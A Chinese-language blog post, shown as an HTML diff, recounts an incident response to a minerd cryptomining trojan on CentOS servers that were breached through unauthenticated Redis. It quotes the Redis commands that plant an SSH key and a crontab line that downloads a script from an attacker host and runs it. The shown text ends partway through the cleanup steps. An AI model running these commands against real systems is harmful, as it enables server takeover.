@@ -1,0 +1,575 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <meta charset="utf-8">
+    
+    <title>彻底清除Linux centos minerd木马 | 星空博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="&amp;#x524D;&amp;#x51E0;&amp;#x5929;&amp;#xFF0C;&amp;#x516C;&amp;#x53F8;&amp;#x4E24;&amp;#x53F0;linux&amp;#x670D;&amp;#x52A1;&amp;#x5668;&amp;#xFF0C;&amp;#x4E00;&amp;#x53F0;&amp;#x8BBF;&amp;#x95EE;&amp;#x901F;&amp;#x5EA6;&amp;#x5F88;&amp;#x6162;&amp;#xFF0C;cpu&amp;#x8DD1;&amp;#x6EE1;&amp;#xFF0C">
+<meta property="og:type" content="article">
+<meta property="og:title" content="彻底清除Linux centos minerd木马">
+<meta property="og:url" content="http://www.wangxin123.com/2016/10/26/彻底清除Linux centos minerd木马/index.html">
+<meta property="og:site_name" content="星空博客">
+<meta property="og:description" content="&amp;#x524D;&amp;#x51E0;&amp;#x5929;&amp;#xFF0C;&amp;#x516C;&amp;#x53F8;&amp;#x4E24;&amp;#x53F0;linux&amp;#x670D;&amp;#x52A1;&amp;#x5668;&amp;#xFF0C;&amp;#x4E00;&amp;#x53F0;&amp;#x8BBF;&amp;#x95EE;&amp;#x901F;&amp;#x5EA6;&amp;#x5F88;&amp;#x6162;&amp;#xFF0C;cpu&amp;#x8DD1;&amp;#x6EE1;&amp;#xFF0C">
+<meta property="og:image" content="http://www.wangxin123.com/2016/10/26/&#x5F7B;&#x5E95;&#x6E05;&#x9664;Linux">
+<meta property="og:updated_time" content="2016-10-29T04:04:25.286Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="彻底清除Linux centos minerd木马">
+<meta name="twitter:description" content="&amp;#x524D;&amp;#x51E0;&amp;#x5929;&amp;#xFF0C;&amp;#x516C;&amp;#x53F8;&amp;#x4E24;&amp;#x53F0;linux&amp;#x670D;&amp;#x52A1;&amp;#x5668;&amp;#xFF0C;&amp;#x4E00;&amp;#x53F0;&amp;#x8BBF;&amp;#x95EE;&amp;#x901F;&amp;#x5EA6;&amp;#x5F88;&amp;#x6162;&amp;#xFF0C;cpu&amp;#x8DD1;&amp;#x6EE1;&amp;#xFF0C">
+<meta name="twitter:image" content="http://www.wangxin123.com/2016/10/26/&#x5F7B;&#x5E95;&#x6E05;&#x9664;Linux">
+    
+
+    
+
+    
+        <link rel="icon" href="/css/images/wu.png" />
+    
+
+    <link rel="stylesheet" href="/vendor/font-awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/vendor/open-sans/styles.css">
+    <link rel="stylesheet" href="/vendor/source-code-pro/styles.css">
+
+    <link rel="stylesheet" href="/css/style.css">
+
+    <script src="/vendor/jquery/2.1.3/jquery.min.js"></script>
+    
+    
+        <link rel="stylesheet" href="/vendor/fancybox/jquery.fancybox.css">
+    
+    
+    
+    
+
+</head>
+<body>
+    <div id="container">
+        <header id="header">
+    <div id="header-main" class="header-inner">
+        <div class="outer">
+            <a href="/" id="logo">
+                <i class="logo"></i>
+                <span class="site-title">星空博客</span>
+            </a>
+            <nav id="main-nav">
+                
+                    <a class="main-nav-link" href="/.">Home</a>
+                
+                    <a class="main-nav-link" href="/archives">Archives</a>
+                
+                    <a class="main-nav-link" href="/categories">Categories</a>
+                
+                    <a class="main-nav-link" href="/tags">Tags</a>
+                
+                    <a class="main-nav-link" href="/about">About</a>
+                
+            </nav>
+            
+                
+                <nav id="sub-nav">
+                    <div class="profile" id="profile-nav">
+                        <a id="profile-anchor" href="javascript:;">
+                            <img class="avatar" src="/css/images/wk.gif" />
+                            <i class="fa fa-caret-down"></i>
+                        </a>
+                    </div>
+                </nav>
+            
+            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="搜索" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="想要查找什么..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+</div>
+        </div>
+    </div>
+    <div id="main-nav-mobile" class="header-sub header-inner">
+        <table class="menu outer">
+            <tr>
+                
+                    <td><a class="main-nav-link" href="/.">Home</a></td>
+                
+                    <td><a class="main-nav-link" href="/archives">Archives</a></td>
+                
+                    <td><a class="main-nav-link" href="/categories">Categories</a></td>
+                
+                    <td><a class="main-nav-link" href="/tags">Tags</a></td>
+                
+                    <td><a class="main-nav-link" href="/about">About</a></td>
+                
+                <td>
+                    
+    <div class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="搜索" />
+    </div>
+
+                </td>
+            </tr>
+        </table>
+    </div>
+</header>
+
+        <div class="outer">
+            
+                
+
+<aside id="profile">
+    <div class="inner profile-inner">
+        <div class="base-info profile-block">
+            <img id="avatar" src="/css/images/wk.gif" />
+            <h2 id="name">Wasim</h2>
+            <h3 id="title">Web Developer</h3>
+            <span id="location"><i class="fa fa-map-marker"></i>ShenZhen, China</span>
+            <a id="follow" target="_blank" href="null">关注我</a>
+        </div>
+        <div class="article-info profile-block">
+            <div class="article-info-block">
+                47
+                <span>文章</span>
+            </div>
+            <div class="article-info-block">
+                29
+                <span>标签</span>
+            </div>
+        </div>
+        
+        <div class="profile-block social-links">
+            <table>
+                <tr>
+                    
+                    <td><a href="https://github.com/Wasim37" target="_blank" title="github"><i class="fa fa-github"></i></a></td>
+                    
+                    <td><a href="/" target="_blank" title="twitter"><i class="fa fa-twitter"></i></a></td>
+                    
+                    <td><a href="/" target="_blank" title="facebook"><i class="fa fa-facebook"></i></a></td>
+                    
+                    <td><a href="/" target="_blank" title="dribbble"><i class="fa fa-dribbble"></i></a></td>
+                    
+                    <td><a href="/" target="_blank" title="rss"><i class="fa fa-rss"></i></a></td>
+                    
+                </tr>
+            </table>
+        </div>
+        
+    </div>
+</aside>
+
+            
+            <section id="main"><article id="post-彻底清除Linux centos minerd木马" class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        
+        
+            <header class="article-header">
+                
+    
+        <h1 class="article-title" itemprop="name">
+            彻底清除Linux centos minerd木马
+        </h1>
+    
+
+                <div class="article-meta">
+                    
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/2016/10/26/彻底清除Linux centos minerd木马/">
+            <time datetime="2016-10-26T14:41:19.000Z" itemprop="datePublished">2016-10-26</time>
+        </a>
+    </div>
+
+
+                    
+    <div class="article-category">
+    	<i class="fa fa-folder"></i>
+        <a class="article-category-link" href="/categories/错误集锦/">错误集锦</a>
+    </div>
+
+                    
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/redis/">redis</a>
+    </div>
+
+                </div>
+            </header>
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+            
+            <blockquote>
+<p>&#x524D;&#x51E0;&#x5929;&#xFF0C;&#x516C;&#x53F8;&#x4E24;&#x53F0;linux&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4E00;&#x53F0;&#x8BBF;&#x95EE;&#x901F;&#x5EA6;&#x5F88;&#x6162;&#xFF0C;cpu&#x8DD1;&#x6EE1;&#xFF0C;&#x4E00;&#x53F0;&#x514D;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#x5931;&#x6548;&#xFF0C;&#x516C;&#x94A5;&#x6587;&#x4EF6;&#x88AB;&#x6539;&#x5199;&#x6210;redis&#x7684;key&#x3002;&#x7528;htop&#x547D;&#x4EE4;&#x67E5;&#x8BE2;&#x53D1;&#x73B0;&#x4E86;minerd&#x6728;&#x9A6C;&#x8FDB;&#x7A0B;&#xFF0C;&#x521D;&#x6B65;&#x731C;&#x6D4B;&#x662F;redis&#x6CA1;&#x6709;&#x914D;&#x8BBF;&#x95EE;&#x6743;&#x9650;&#x9020;&#x6210;&#x7684;&#x3002;&#x7F51;&#x4E0A;&#x67E5;&#x8BE2;minerd&#x6728;&#x9A6C;&#xFF0C;&#x53D1;&#x73B0;&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x5F88;&#x5E38;&#x89C1;&#x7684;&#x6316;&#x77FF;&#x7A0B;&#x5E8F;&#xFF0C;&#x76F8;&#x5173;&#x731C;&#x6D4B;&#x4E5F;&#x5F97;&#x5230;&#x4E86;&#x9A8C;&#x8BC1;&#x3002;</p>
+</blockquote>
+<p>&#x4E0B;&#x6587;&#x662F;&#x7F51;&#x4E0A;&#x641C;&#x7D22;&#x5230;&#x7684;&#x6E05;&#x9664;minerd&#x6728;&#x9A6C;&#x65B9;&#x6CD5;&#x3002;</p>
+<h2 id="&#x73B0;&#x72B6;&#x63CF;&#x8FF0;"><a href="#&#x73B0;&#x72B6;&#x63CF;&#x8FF0;" class="headerlink" title="&#x73B0;&#x72B6;&#x63CF;&#x8FF0;"></a>&#x73B0;&#x72B6;&#x63CF;&#x8FF0;</h2><p>1&#x3001;top&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x8FD9;&#x4E2A;minerd &#x7A0B;&#x5E8F;&#x628A;cpu&#x8DD1;&#x6EE1;&#x4E86;</p>
+<p><img src="/2016/10/26/&#x5F7B;&#x5E95;&#x6E05;&#x9664;Linux centos minerd&#x6728;&#x9A6C;/1.jpg" alt="1.jpg"><br>2&#x3001;ps aux | grep minerd<br>&#x53EF;&#x77E5;&#x662F;&#x8FD9;&#x4E2A;&#x7A0B;&#x5E8F;: /opt/minerd</p>
+<a id="more"></a>
+<p>&#x8FD9;&#x4E2A;&#x4E0D;&#x662F;&#x6211;&#x4EEC;&#x81EA;&#x5DF1;&#x542F;&#x52A8;&#x7684;&#xFF0C;&#x53EF;&#x4EE5;&#x65AD;&#x5B9A;&#x670D;&#x52A1;&#x5668;&#x88AB;&#x9ED1;&#x4E86;<br>&#x8FD9;&#x4E2A;&#x8FDB;&#x7A0B;&#x662F;root&#x7528;&#x6237;&#x542F;&#x52A8;&#x7684;&#xFF0C;&#x4EE3;&#x7801;&#x6709;&#x6F0F;&#x6D1E;&#x53EF;&#x80FD;&#x6027;&#x4E0D;&#x5927;&#xFF08;web&#x670D;&#x52A1;&#x662F;www&#x7528;&#x6237;&#x542F;&#x52A8;&#x7684;&#xFF09;&#xFF0C;&#x591A;&#x534A;&#x9ED1;&#x5BA2;&#x5DF2;&#x7ECF;&#x767B;&#x5F55;&#x670D;&#x52A1;&#x5668;&#x4E86;</p>
+<p><img src="/2016/10/26/&#x5F7B;&#x5E95;&#x6E05;&#x9664;Linux centos minerd&#x6728;&#x9A6C;/2.jpg" alt="2.jpg"><br>3&#x3001;&#x6709;&#x53EF;&#x80FD;&#x662F;&#x514D;&#x5BC6;&#x767B;&#x5F55;&#x4E86;&#xFF0C;&#x53BB;/root/.ssh &#x76EE;&#x5F55;&#x4E0B;&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x53D1;&#x73B0;authorized_keys&#xFF0C;&#x4F46;&#x53D1;&#x73B0;&#x4E86;KHK75NEOiq&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;</p>
+<p>&#x67E5;&#x770B; vim KHK75NEOiq<br>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5185;&#x5BB9;&#x5C31;&#x662F;&#x514D;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#x7684;&#x516C;&#x94A5;</p>
+<p><img src="/2016/10/26/&#x5F7B;&#x5E95;&#x6E05;&#x9664;Linux centos minerd&#x6728;&#x9A6C;/3.jpg" alt="3.jpg"><br>4&#x3001;&#x5728;ssh&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;/etc/ssh/sshd_config&#x4E2D;&#x4E5F;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x628A;AuthorizedKeysFile&#x6307;&#x5411;&#x4E86;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x4E86;&#xFF08;.ssh/KHK75NEOiq&#xFF09;</p>
+<p>&#x731C;&#x60F3;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A;&#x901A;&#x8FC7;authorized_keys&#x514D;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#x540E;&#xFF0C;&#x5728;&#x8FD9;&#x4E2A;&#x76EE;&#x5F55;&#x4E0B;&#x521B;&#x5EFA;&#x4E86;KHK75NEOiq&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x4FEE;&#x6539;&#x4E86;AuthorizedKeysFile&#x7684;&#x6307;&#x5411;&#xFF0C;&#x5C31;&#x628A;authorized_keys&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x5220;&#x9664;&#x4E86;&#x3002;</p>
+<p><img src="/2016/10/26/&#x5F7B;&#x5E95;&#x6E05;&#x9664;Linux centos minerd&#x6728;&#x9A6C;/4.jpg" alt="4.jpg"><br>5&#x3001;&#x90A3;&#x4E48;&#x662F;&#x5199;&#x8FDB;&#x6765;authorized_keys&#x7684;&#x90A3;&#xFF1F;</p>
+<p>&#x4E4B;&#x524D;&#x6211;&#x5904;&#x7406;&#x8FC7;&#x7C7B;&#x4F3C;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x662F;redis&#x672A;&#x6388;&#x6743;&#x5BFC;&#x81F4;&#x7684;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x5916;&#x7F51;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4E0D;&#x7528;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#x6211;&#x7684;redis, &#x8FDE;&#x4E0A;redis&#x540E;&#xFF0C;&#x901A;&#x8FC7;&#x4EE5;&#x4E0B;&#x547D;&#x4EE4;&#x5373;&#x53EF;&#x521B;&#x5EFA;&#x6587;&#x4EF6;&#xFF1A;</p>
+<font style="color:red"><strong>config set dir /root/.ssh<br>config set dbfilename authorized_keys<br>set key value&#xFF0C;&#x5176;&#x4E2D;value&#x4E3A;&#x751F;&#x6210;&#x516C;&#x94A5;&#xFF0C;&#x5373;&#x53EF;&#x5C06;&#x516C;&#x94A5;&#x4FDD;&#x5B58;&#x5728;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4F7F;&#x5F97;&#x767B;&#x5F55;&#x65F6;&#x4E0D;&#x9700;&#x8981;&#x8F93;&#x5165;&#x8D26;&#x53F7;&#x4E0E;&#x5BC6;&#x7801;&#x3002;</strong></font>
+
+<p><br></p>
+<hr>
+<h2 id="&#x5148;&#x5835;&#x4F4F;&#x514D;&#x767B;&#x5F55;&#x6F0F;&#x6D1E;"><a href="#&#x5148;&#x5835;&#x4F4F;&#x514D;&#x767B;&#x5F55;&#x6F0F;&#x6D1E;" class="headerlink" title="&#x5148;&#x5835;&#x4F4F;&#x514D;&#x767B;&#x5F55;&#x6F0F;&#x6D1E;"></a>&#x5148;&#x5835;&#x4F4F;&#x514D;&#x767B;&#x5F55;&#x6F0F;&#x6D1E;</h2><p>1&#x3001;&#x4FEE;&#x6539;ssh&#x7AEF;&#x53E3;<br>&#x7F16;&#x8F91;/etc/ssh/sshd_config&#x6587;&#x4EF6;&#x4E2D;&#x7684;Port 22&#x5C06;22&#x4FEE;&#x6539;&#x4E3A;&#x5176;&#x4ED6;&#x7AEF;&#x53E3;</p>
+<p>2&#x3001;&#x7981;&#x6B62;root&#x7528;&#x6237;&#x767B;&#x9646;<br>&#x7F16;&#x8F91;/etc/ssh/sshd_config&#x6587;&#x4EF6;&#x4E2D;&#x7684;PermitRootLogin &#x4FEE;&#x6539;&#x4E3A;no</p>
+<p>3&#x3001;&#x4FEE;&#x6539;&#x65E0;&#x5BC6;&#x7801;&#x767B;&#x9646;&#x7684;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;<br>&#x7F16;&#x8F91;/etc/ssh/sshd_config&#x6587;&#x4EF6;&#x4E2D;&#x7684;AuthorizedKeysFile &#x4FEE;&#x6539;&#x4E3A;&#x5176;&#x4ED6;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;</p>
+<p>4&#x3001;&#x5220;&#x9664; .ssh&#x4E0B;&#x7684; KHK75NEOiq</p>
+<p>5&#x3001;&#x4E0D;&#x8BA9;&#x5916;&#x7F51;&#x76F4;&#x63A5;&#x8FDE;&#x63A5;<br>&#x5728; redis.conf &#x6587;&#x4EF6;&#x4E2D;&#x627E;&#x5230;#bind 127.0.0.1&#xFF0C;&#x628A;&#x524D;&#x9762;&#x7684;#&#x53F7;&#x53BB;&#x6389;&#xFF0C;&#x91CD;&#x542F;</p>
+<hr>
+<h2 id="&#x627E;&#x5230;&#x6728;&#x9A6C;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;"><a href="#&#x627E;&#x5230;&#x6728;&#x9A6C;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;" class="headerlink" title="&#x627E;&#x5230;&#x6728;&#x9A6C;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;"></a>&#x627E;&#x5230;&#x6728;&#x9A6C;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;</h2><p>1&#x3001;&#x901A;&#x5E38;&#x76F4;&#x63A5;kill&#x6389;&#x8FDB;&#x7A0B;&#xFF0C;&#x662F;&#x4E0D;&#x597D;&#x4F7F;&#x7684;&#xFF0C;&#x80AF;&#x5B9A;&#x6709;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#xFF0C;&#x8FD8;&#x6709;&#x7CFB;&#x7EDF;&#x81EA;&#x542F;&#x52A8;&#xFF0C;&#x6240;&#x4EE5;&#x6E05;&#x7406;&#x6B65;&#x9AA4;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A;<br>1&#xFF09;&#x5E72;&#x6389;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;<br>2&#xFF09;&#x5E72;&#x6389;&#x7CFB;&#x7EDF;&#x81EA;&#x542F;&#x52A8;<br>3&#xFF09;&#x5E72;&#x6389;&#x6728;&#x9A6C;&#x8FDB;&#x7A0B;</p>
+<p>&#x627E;&#x5230;&#x6728;&#x9A6C;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x5E76;&#x5E72;&#x6389;</p>
+<p>&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x6709;&#x5927;&#x6982;&#x6709;&#x4E24;&#x79CD;&#x5B58;&#x5728;&#x5F62;&#x5F0F;&#xFF0C;crontab &#x548C;&#x5E38;&#x9A7B;&#x8FDB;&#x7A0B;&#xFF0C;&#x5E38;&#x9A7B;&#x8FDB;&#x7A0B;&#x5F97;&#x6162;&#x6162;&#x5206;&#x6790;&#xFF0C;&#x6211;&#x4EEC;&#x5148;&#x770B;crontab&#xFF0C;&#x6709;&#x4E00;&#x6761;&#x4E0D;&#x662F;&#x6211;&#x521B;&#x5EFA;&#x7684;&#x4EFB;&#x52A1;&#x3002;&#x4EFB;&#x52A1;&#x662F;&#xFF1A;&#x76F4;&#x63A5;&#x4ECE;&#x8FDC;&#x7A0B;&#x4E0B;&#x8F7D;&#x4E00;&#x4E2A;&#x811A;&#x672C;pm.sh &#x5E76;&#x6267;&#x884C;&#x3002;</p>
+<p><img src="/2016/10/26/&#x5F7B;&#x5E95;&#x6E05;&#x9664;Linux centos minerd&#x6728;&#x9A6C;/5.jpg" alt="5.jpg"></p>
+<p>2&#x3001;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x770B;&#x8FD9;&#x4E2A;&#x811A;&#x672C;</p>
+<p><img src="/2016/10/26/&#x5F7B;&#x5E95;&#x6E05;&#x9664;Linux centos minerd&#x6728;&#x9A6C;/6.jpg" alt="6.jpg"></p>
+<p>3&#x3001;&#x5927;&#x81F4;&#x903B;&#x8F91;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A;<br>1&#xFF09;&#x628A; <em>/10 </em> <em> </em> * curl -fsSL <a href="http://r.chanstring.com/pm.sh?0706" target="_blank" rel="external">http://r.chanstring.com/pm.sh?0706</a> | sh &#x5199;&#x5165;crontab<br>2&#xFF09;&#x628A;authorized_keys&#x5220;&#x6389;&#xFF0C;&#x5E76;&#x521B;&#x5EFA;&#x514D;&#x767B;&#x5F55;&#x6587;&#x4EF6;/root/.ssh/KHK75NEOiq&#xFF0C;&#x4FEE;&#x6539;ssh&#x914D;&#x7F6E;&#x91CD;&#x542F;<br>3&#xFF09;curl&#x4E0B;&#x8F7D;/opt/KHK75NEOiq33 &#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x6267;&#x884C;&#x5B89;&#x88C5;&#xFF08;/opt/KHK75NEOiq33 &#x2013;Install&#xFF09;&#xFF0C;&#x7136;&#x540E;&#x542F;&#x52A8;ntp</p>
+<p>4&#x3001;&#x57FA;&#x672C;&#x53EF;&#x4EE5;&#x65AD;&#x5B9A;&#x8FD9;&#x4E2A;ntp&#x5C31;&#x662F;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#xFF0C;&#x4F46;&#x770B;&#x5230;ntp&#x771F;&#x7684;&#x6709;&#x4E9B;&#x6015;&#x6015;&#xFF0C;ntp&#x4E0D;&#x662F;&#x641E;&#x65F6;&#x95F4;&#x540C;&#x6B65;&#x7684;&#x5417;&#xFF0C;&#x5176;&#x5B9E; Linux&#x6B63;&#x5E38;&#x7684;ntp&#x670D;&#x52A1;&#x53EB;ntpd&#xFF0C;&#x5E76;&#x975E;ntp&#xFF0C;&#x5F88;&#x6709;&#x8FF7;&#x60D1;&#x6027;&#x554A;</p>
+<p><img src="/2016/10/26/&#x5F7B;&#x5E95;&#x6E05;&#x9664;Linux centos minerd&#x6728;&#x9A6C;/7.jpg" alt="7.jpg"></p>
+<p>5&#x3001;&#x4F46;&#x4E3A;&#x4E86;&#x8BA9;&#x81EA;&#x5DF1;&#x653E;&#x5FC3;&#xFF0C;&#x8FD8;&#x662F;&#x6821;&#x9A8C;&#x4E86;&#x4E00;&#x756A;<br>&#x6211;&#x4EEC;&#x5148;&#x4ECE;&#x65F6;&#x95F4;&#x4E0A;&#x6821;&#x9A8C;&#xFF0C;ntp&#x662F;&#x4E0D;&#x662F;&#x6728;&#x9A6C;&#x4EFB;&#x52A1;&#x540E;&#x521B;&#x5EFA;&#x7684;</p>
+<p>&#x67E5;&#x770B;&#x8FD9;&#x4E2A;&#x6728;&#x9A6C;&#x4EFB;&#x52A1;&#x7B2C;&#x4E00;&#x6B21;&#x6267;&#x884C;&#x7684;&#x65F6;&#x95F4;<br>&#x53BB;/var/log&#x4E0B;&#x770B;cron&#x7684;&#x65E5;&#x5FD7;</p>
+<p><img src="/2016/10/26/&#x5F7B;&#x5E95;&#x6E05;&#x9664;Linux centos minerd&#x6728;&#x9A6C;/8.jpg" alt="8.jpg"></p>
+<p>6&#x3001;Jul 24 09:23:01 &#x7B2C;&#x4E00;&#x6B21;&#x6267;&#x884C;&#xFF1A; curl -L <a href="http://r.chanstring.com/pm.sh?0703" target="_blank" rel="external">http://r.chanstring.com/pm.sh?0703</a><br>Jul 24 09:30:01 &#x7B2C;&#x4E00;&#x6B21;&#x6211;&#x4EEC;&#x76EE;&#x524D;crontab&#x91CC;&#x7684;&#x4EFB;&#x52A1;&#xFF1A;curl -fsSL <a href="http://r.chanstring.com/pm.sh?0706" target="_blank" rel="external">http://r.chanstring.com/pm.sh?0706</a><br>Jul 24 09:49 &#x811A;&#x672C;/etc/init.d/ntp&#x7684;&#x521B;&#x5EFA;&#x65F6;&#x95F4;</p>
+<p>&#x4ECE;pm.sh&#x8FD9;&#x4E2A;&#x811A;&#x672C;&#x53EF;&#x77E5; curl&#x4E0B;&#x6765;/opt/KHK75NEOiq33&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x6267;&#x884C;&#x5B89;&#x88C5; /opt/KHK75NEOiq33 &#x2013;Install &#x6BD4;&#x8F83;&#x8017;&#x65F6;&#x95F4;&#xFF0C;&#x6211;&#x6267;&#x884C;&#x4E86;&#x4E00;&#x4E0B;&#xFF0C;&#x5728;&#x6211;&#x7684;&#x673A;&#x5668;&#x4E0A;&#x662F;10&#x591A;&#x5206;&#x949F;&#x3002;</p>
+<p>&#x6240;&#x4EE5;&#x521B;&#x5EFA;&#x65F6;&#x95F4;&#x4E0A;&#x57FA;&#x672C;&#x543B;&#x5408;</p>
+<p><img src="/2016/10/26/&#x5F7B;&#x5E95;&#x6E05;&#x9664;Linux centos minerd&#x6728;&#x9A6C;/9.jpg" alt="9.jpg"></p>
+<p>7&#x3001;&#x6211;&#x4EEC;&#x770B;&#x4E00;&#x4E0B;ntp&#x7684;&#x968F;&#x7CFB;&#x7EDF;&#x542F;&#x52A8;<br>runlevel 2 3 4 5&#x90FD;&#x542F;&#x52A8;&#x4E86;&#xFF0C;&#x591F;&#x72E0;&#x7684;&#x5440;</p>
+<p><img src="/2016/10/26/&#x5F7B;&#x5E95;&#x6E05;&#x9664;Linux centos minerd&#x6728;&#x9A6C;/10.jpg" alt="10.jpg"></p>
+<p>8&#x3001;&#x770B;&#x4E00;&#x4E0B;&#x5E38;&#x7528;&#x7684;3&#x5427;<br>&#x53EF;&#x4EE5;&#x770B;&#x5230; &#x6709;&#x4E2A;S50ntp &#x8F6F;&#x94FE;&#x4E86;&#x811A;&#x672C;/etc/init.d/ntp</p>
+<p><img src="/2016/10/26/&#x5F7B;&#x5E95;&#x6E05;&#x9664;Linux centos minerd&#x6728;&#x9A6C;/11.jpg" alt="11.jpg"></p>
+<p>9&#x3001;&#x6211;&#x4EEC;&#x67E5;&#x770B;&#x7CFB;&#x7EDF;&#x542F;&#x52A8;&#x65E5;&#x5FD7;<br>vim /var/log/boot.log<br>&#x6709;&#x4E00;&#x6761;&#x662F;Staring S50ntp&#xFF0C;&#x8FD9;&#x4E2A;&#x57FA;&#x672C;&#x5BF9;&#x5E94;&#x811A;&#x672C;/etc/init.d/ntp &#x4E2D;&#x7684; echo &#x201C;Starting $name&#x201D;</p>
+<p><img src="/2016/10/26/&#x5F7B;&#x5E95;&#x6E05;&#x9664;Linux centos minerd&#x6728;&#x9A6C;/12.jpg" alt="12.jpg"></p>
+<p>10&#x3001;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x4E00;&#x4E0B; /etc/init.d/ntp &#x8FD9;&#x4E2A;&#x811A;&#x672C;<br>$name&#x5E94;&#x8BE5;&#x5C31;&#x5BF9;&#x5E94;&#x7684;&#x503C;&#x662F; S50ntp&#xFF0C;&#x901A;&#x8FC7;stdout_log,stderr_log,pid_file&#x4E5F;&#x5F97;&#x5230;&#x4E86;&#x9A8C;&#x8BC1;&#x3002;</p>
+<p><img src="/2016/10/26/&#x5F7B;&#x5E95;&#x6E05;&#x9664;Linux centos minerd&#x6728;&#x9A6C;/13.jpg" alt="13.jpg"></p>
+<p>11&#x3001;&#x901A;&#x8FC7;&#x641C;&#x7D22;&#x5B89;&#x88C5;&#x6587;&#x4EF6;&#xFF08;/opt/KHK75NEOiq33&#xFF09;&#xFF0C;&#x53EF;&#x77E5;&#x770B;&#x5230; /opt/KHK75NEOiq33 &#x2013;Install&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x5199;&#x5165;&#x4E86;ntp&#x811A;&#x672C; &#x81EA;&#x542F;&#x52A8; /opt/minerd&#x7B49;&#x4E00;&#x7CFB;&#x5217;&#x7684;&#x64CD;&#x4F5C;&#x3002;</p>
+<p><img src="/2016/10/26/&#x5F7B;&#x5E95;&#x6E05;&#x9664;Linux centos minerd&#x6728;&#x9A6C;/14.jpg" alt="14.jpg"></p>
+<p>12&#x3001;&#x6253;&#x5F00; /usr/local/etc/minerd.conf&#xFF0C;&#x5185;&#x5BB9;&#x5C31;&#x662F;/opt/minerd&#x8FD9;&#x4E2A;&#x8FDB;&#x7A0B;&#x540E;&#x7684;&#x4E00;&#x4E9B;&#x53C2;&#x6570;</p>
+<p><img src="/2016/10/26/&#x5F7B;&#x5E95;&#x6E05;&#x9664;Linux centos minerd&#x6728;&#x9A6C;/15.jpg" alt="15.jpg"></p>
+<p>13&#x3001;&#x597D;&#x4E86; &#x9A8C;&#x8BC1;&#x5B8C;&#x6BD5;&#xFF0C;&#x53EF;&#x4EE5;&#x5E72;&#x6389;&#x8FD9;&#x4E2A;ntp&#x4E86;</p>
+<hr>
+<h2 id="&#x6E05;&#x7406;&#x6728;&#x9A6C;"><a href="#&#x6E05;&#x7406;&#x6728;&#x9A6C;" class="headerlink" title="&#x6E05;&#x7406;&#x6728;&#x9A6C;"></a>&#x6E05;&#x7406;&#x6728;&#x9A6C;</h2><p>1&#x3001;&#x53BB;&#x6389;crontab&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x6709;&#x5173;&#x6728;&#x9A6C;&#x5185;&#x5BB9;&#xFF1A;<br>/var/spool/cron/crontabs/root<br>/var/spool/cron/root</p>
+<p>2&#x3001;&#x5E72;&#x6389;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;ntp&#xFF0C;&#x5E76;&#x5220;&#x9664;&#x76F8;&#x5173;&#x6587;&#x4EF6;</p>
